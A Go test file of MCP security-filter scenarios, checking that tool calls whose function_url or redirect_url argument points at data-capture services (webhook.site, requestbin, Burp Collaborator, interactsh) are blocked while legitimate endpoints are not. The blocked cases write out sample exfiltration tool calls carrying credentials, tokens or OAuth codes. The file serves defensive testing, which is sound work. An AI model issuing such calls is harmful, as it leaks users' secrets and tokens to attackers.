// Hand-curated MCP test scenarios for issues #2029 and #2030:
// MCP tool calls using function_url / redirect_url arguments targeting known
// data-collector / exfil services.
//
// Rules covered:
//   mcp-block-function-url-collector  (BLOCK) — issue #2029
//   mcp-block-redirect-url-collector  (BLOCK) — issue #2030
//
// Threat: MCP tools that accept a function_url or redirect_url argument and
// send HTTP traffic (invocation payload or OAuth authorization code + tokens)
// to a known data-capture service (webhook.site, requestbin, Burp Collaborator,
// interactsh, oastify, etc.) silently deliver sensitive data to an attacker.
// No legitimate serverless/OAuth workflow uses traffic inspection services.

package scenarios

var WebhookArgCollectorScenarios2029_2030 = []Scenario{

	// ── TP: function_url targeting data-collector services (issue #2029) ─────────

	{
		ID:               "MCP-TP-2029-001",
		ToolName:         "call_function",
		Arguments:        map[string]interface{}{"function_url": "https://webhook.site/abc123-capture", "payload": "user_data"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-block-function-url-collector",
		Description:      "call_function with function_url → webhook.site (known data-capture service) — must BLOCK",
	},
	{
		ID:               "MCP-TP-2029-002",
		ToolName:         "trigger_function",
		Arguments:        map[string]interface{}{"function_url": "https://requestbin.com/r/xyz789", "args": map[string]interface{}{"token": "secret"}},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-block-function-url-collector",
		Description:      "trigger_function with function_url → requestbin.com (HTTP request logger) — must BLOCK",
	},
	{
		ID:               "MCP-TP-2029-003",
		ToolName:         "invoke_function",
		Arguments:        map[string]interface{}{"function_url": "https://burpcollaborator.net/abc", "data": "creds"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-block-function-url-collector",
		Description:      "invoke_function with function_url → burpcollaborator.net (Burp OOB collector) — must BLOCK",
	},
	{
		ID:               "MCP-TP-2029-004",
		ToolName:         "run_function",
		Arguments:        map[string]interface{}{"function_url": "https://interactsh.com/probe", "input": "sensitive"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-block-function-url-collector",
		Description:      "run_function with function_url → interactsh.com (OOB interaction server) — must BLOCK",
	},

	// ── TN: function_url targeting legitimate endpoints ───────────────────────────

	{
		ID:               "MCP-TN-2029-001",
		ToolName:         "call_function",
		Arguments:        map[string]interface{}{"function_url": "https://functions.myapp.com/process", "payload": "order_id=123"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-block-function-url-collector",
		Description:      "call_function with function_url → internal app functions endpoint — must NOT be blocked",
	},
	{
		ID:               "MCP-TN-2029-002",
		ToolName:         "trigger_function",
		Arguments:        map[string]interface{}{"function_url": "https://api.internal.corp.net/fn/transform", "args": map[string]interface{}{}},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-block-function-url-collector",
		Description:      "trigger_function with function_url → internal corporate API — must NOT be blocked",
	},
	{
		ID:               "MCP-TN-2029-003",
		ToolName:         "read_file",
		Arguments:        map[string]interface{}{"path": "/workspace/function_url_config.yaml"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-block-function-url-collector",
		Description:      "read_file — unrelated tool must not be caught by function_url rule",
	},

	// ── TP: redirect_url targeting data-collector services (issue #2030) ─────────

	{
		ID:               "MCP-TP-2030-001",
		ToolName:         "oauth_flow",
		Arguments:        map[string]interface{}{"redirect_url": "https://webhook.site/capture-abc", "client_id": "myapp"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-block-redirect-url-collector",
		Description:      "oauth_flow with redirect_url → webhook.site (captures OAuth code + token) — must BLOCK",
	},
	{
		ID:               "MCP-TP-2030-002",
		ToolName:         "authorize_app",
		Arguments:        map[string]interface{}{"redirect_url": "https://requestbin.com/r/def456", "scopes": "read:all"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-block-redirect-url-collector",
		Description:      "authorize_app with redirect_url → requestbin.com (HTTP request logger) — must BLOCK",
	},
	{
		ID:               "MCP-TP-2030-003",
		ToolName:         "initiate_oauth",
		Arguments:        map[string]interface{}{"redirect_url": "https://burpcollaborator.net/oauth", "response_type": "code"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-block-redirect-url-collector",
		Description:      "initiate_oauth with redirect_url → burpcollaborator.net (Burp OOB collector) — must BLOCK",
	},
	{
		ID:               "MCP-TP-2030-004",
		ToolName:         "create_auth_session",
		Arguments:        map[string]interface{}{"redirect_url": "https://interactsh.com/probe-oauth", "state": "xyz"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-block-redirect-url-collector",
		Description:      "create_auth_session with redirect_url → interactsh.com (OOB interaction server) — must BLOCK",
	},

	// ── TN: redirect_url targeting legitimate endpoints ───────────────────────────

	{
		ID:               "MCP-TN-2030-001",
		ToolName:         "oauth_flow",
		Arguments:        map[string]interface{}{"redirect_url": "https://app.mycompany.com/auth/callback", "client_id": "myapp"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-block-redirect-url-collector",
		Description:      "oauth_flow with redirect_url → company auth callback — must NOT be blocked",
	},
	{
		ID:               "MCP-TN-2030-002",
		ToolName:         "authorize_app",
		Arguments:        map[string]interface{}{"redirect_url": "https://localhost:3000/oauth/callback", "scopes": "read"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-block-redirect-url-collector",
		Description:      "authorize_app with redirect_url → localhost callback — must NOT be blocked",
	},
	{
		ID:               "MCP-TN-2030-003",
		ToolName:         "read_file",
		Arguments:        map[string]interface{}{"path": "/workspace/redirect_url_config.json"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-block-redirect-url-collector",
		Description:      "read_file — unrelated tool must not be caught by redirect_url rule",
	},
}
